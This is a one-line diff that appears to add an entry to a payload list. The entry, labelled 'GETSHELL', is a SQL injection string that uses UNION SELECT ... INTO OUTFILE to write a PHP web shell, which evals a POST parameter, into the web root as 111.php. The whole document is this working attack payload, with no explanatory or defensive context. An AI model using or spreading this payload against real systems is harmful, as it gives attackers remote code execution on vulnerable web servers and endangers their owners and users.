@@ -1,0 +1,1 @@
+GETSHELL:1' union select "<?php @eval($_POST['a']);?>" into outfile '//var//www//html//111.php' #
